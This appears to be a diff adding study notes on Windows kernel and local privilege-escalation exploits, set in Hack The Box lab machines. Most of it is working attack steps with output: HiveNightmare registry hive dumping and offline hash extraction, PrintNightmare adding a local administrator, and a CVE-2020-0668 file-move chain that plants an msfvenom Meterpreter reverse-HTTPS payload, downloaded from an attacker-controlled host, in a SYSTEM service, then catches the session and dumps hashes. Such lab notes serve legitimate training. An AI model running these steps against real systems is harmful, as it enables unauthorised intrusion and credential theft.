@@ -2391,4 +2391,293 @@ Get-CimInstance Win32_StartupCommand | select Name, Command, Location, User
 
 ---
 
+# Kernel exploits 
+
+## Patch management overview
+
+- **Reality:** 100% patch compliance is unlikely; SCCM/WSUS deployments can fail.
+- **Risk:** Legacy OS versions and deprecated protocols (e.g., SMBv1) expand the attack surface.
+- **Trend:** New vulnerabilities often affect down-level Windows versions; patch, upgrade, retire, or segment EOL systems.
+
+
+## Exploit coverage table summary (XP → Server 2016)
+
+- Broad coverage for XP → Server 2012R2; fewer publicly known exploits for Windows 10/Server 2016 due to OS hardening.
+- New exploit releases (e.g., MS17-010) typically impact multiple OS generations.
+
+## Notable vulnerabilities
+
+### MS08-067 (RPC/Server service RCE)
+- Type: RCE via improper RPC handling.
+- Impact: Unauthenticated SYSTEM code execution.
+- Scope: XP, Vista; Server 2000/2003/2008.
+- Note: Can be used as LPE by forwarding SMB/445 if blocked externally.
+- Demo: HTB “Legacy”.
+
+### MS17-010 (EternalBlue, SMBv1 RCE)
+- Type: RCE in SMBv1 mishandling crafted packets.
+- Impact: SYSTEM code execution.
+- Scope: XP → Server 2016.
+- Note: Also usable for local escalation via port forwarding.
+- Demo: HTB “Blue”.
+
+### ALPC Task Scheduler 0‑day (SchRpcSetSecurity / Spooler chain)
+- Method: Write arbitrary DACLs to .job, hardlink + DLL hijack via XPS printer, escalate via Spooler.
+- Demo: HTB “Hackback”.
+
+
+## CVE-2021-36934 (HiveNightmare / SeriousSam)
+
+### Check SAM ACLs
+```cmd
+icacls c:\Windows\System32\config\SAM
+```
+
+Example vulnerable output:
+```text
+C:\Windows\System32\config\SAM BUILTIN\Administrators:(I)(F)
+                               NT AUTHORITY\SYSTEM:(I)(F)
+                               BUILTIN\Users:(I)(RX)
+                               APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                               APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+```
+
+- Requirement: Presence of shadow copies (typically created via System Protection).
+
+### Dump registry hives (PoC)
+```powershell
+PS C:\Users\htb-student\Desktop> .\HiveNightmare.exe
+
+HiveNightmare v0.6 - dump registry hives as non-admin users
+Running...
+
+Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
+Success: SAM hive from 2021-08-07 written out to current working directory as SAM-2021-08-07
+
+Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
+Success: SECURITY hive from 2021-08-07 written out to current working directory as SECURITY-2021-08-07
+
+Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM
+Success: SYSTEM hive from 2021-08-07 written out to current working directory as SYSTEM-2021-08-07
+```
+
+### Parse hashes offline (Impacket)
+```bash
+impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
+```
+
+Example output (truncated):
+```text
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+...
+[*] Dumping LSA Secrets
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x3c7b7e66890fb2181a74bb56ab12195f248e9461
+dpapi_userkey:0xc3e6491e75d7cffe8efd40df94d83cba51832a56
+```
+
+## CVE-2021-1675 / CVE-2021-34527 (PrintNightmare)
+
+### Check if Spooler pipe exists
+```powershell
+PS C:\htb> ls \\localhost\pipe\spoolss
+```
+
+Expected:
+```text
+Directory: \\localhost\pipe
+spoolss
+```
+
+### Bypass execution policy
+```powershell
+PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process
+```
+
+### Import PoC and add local admin (noisy)
+```powershell
+PS C:\htb> Import-Module .\CVE-2021-1675.ps1
+PS C:\htb> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
+```
+
+Example output:
+```text
+[+] created payload at C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
+[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_ce3301b66255a0fb\Amd64\mxdwdrv.dll"
+[+] added user hacker as local administrator
+[+] deleting payload from C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
+```
+
+### Confirm user
+```powershell
+PS C:\htb> net user hacker
+```
+
+## Enumerating missing patches
+
+### Quick checks
+```powershell
+PS C:\htb> systeminfo
+PS C:\htb> wmic qfe list brief
+PS C:\htb> Get-Hotfix
+```
+
+Example WMI output:
+```text
+Description        HotFixID   InstalledOn
+Update             KB4601056  3/27/2021
+Security Update    KB4580325  3/27/2021
+Security Update    KB5000808  3/27/2021
+```
+
+- Action: Search KBs in Microsoft Update Catalog; e.g., KB5000808 (Mar 2021) indicates outdated system.
+
+## CVE-2020-0668 (Windows Kernel elevation via Service Tracing)
+
+### Check current privileges
+```cmd
+whoami /priv
+```
+
+Expected:
+```text
+SeChangeNotifyPrivilege Enabled
+... others Disabled
+```
+
+### Build exploit (Visual Studio) results in:
+```text
+CVE-2020-0668.exe
+CVE-2020-0668.exe.config
+CVE-2020-0668.pdb
+NtApiDotNet.dll
+NtApiDotNet.xml
+```
+
+- Note: Privileged file moves need chaining (e.g., UsoDllLoader/DiagHub) or leveraging SYSTEM services.
+
+## Leveraging Mozilla Maintenance Service (SYSTEM, startable by users)
+
+### Binary path
+```text
+C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
+```
+
+### Check ACLs
+```cmd
+icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
+```
+
+Expected (pre-exploit):
+```text
+NT AUTHORITY\SYSTEM:(I)(F)
+BUILTIN\Administrators:(I)(F)
+BUILTIN\Users:(I)(RX)
+...
+```
+
+### Generate payload (example)
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<your_ip> LPORT=8443 -f exe > maintenanceservice.exe
+```
+
+### Host payload
+```bash
+python3 -m http.server 8080
+```
+
+### Download two copies (one will be corrupted during move)
+```powershell
+PS C:\htb> wget http://<your_ip>:8080/maintenanceservice.exe -O maintenanceservice.exe
+PS C:\htb> wget http://<your_ip>:8080/maintenanceservice.exe -O maintenanceservice2.exe
+```
+
+### Run CVE-2020-0668 move exploit
+```cmd
+C:\htb> C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
+```
+
+Example output:
+```text
+[+] Moving ...maintenanceservice.exe to ...\Mozilla Maintenance Service\maintenanceservice.exe
+[+] Mounting \RPC Control onto ...
+[+] Creating symbol links
+[+] Updating ...\Tracing\RASPLAP ...
+[+] Sleeping for 5 seconds ...
+[+] Writing phonebook file ...
+[+] Cleaning up
+[+] Done!
+```
+
+### Verify new ACLs (post-exploit)
+```cmd
+icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
+```
+
+Expected:
+```text
+NT AUTHORITY\SYSTEM:(F)
+BUILTIN\Administrators:(F)
+WINLPE-WS02\htb-student:(F)
+```
+
+### Replace corrupted file with second copy (use cmd, not PowerShell)
+```cmd
+copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
+```
+
+## Metasploit handler
+
+### Resource script (handler.rc)
+```text
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST <your_ip>
+set LPORT 8443
+exploit
+```
+
+### Launch with RC
+```bash
+sudo msfconsole -r handler.rc
+```
+
+
+## Start service and receive session
+
+### Start service (may error but still execute)
+```cmd
+net start MozillaMaintenance
+```
+
+Example:
+```text
+The service is not responding to the control function
+NET HELPMSG 2186
+```
+
+### Handler output and session
+```text
+[*] Started HTTPS reverse handler on https://<your_ip>:8443
+[*] ... Staging x64 payload ...
+[*] Meterpreter session 1 opened ...
+```
+
+### Confirm SYSTEM
+```text
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+meterpreter > sysinfo
+OS: Windows 10 (10.0 Build 18363)
+
+meterpreter > hashdump
+Administrator:500:...
+htb-student:1002:...
+```
+
+---
+
 
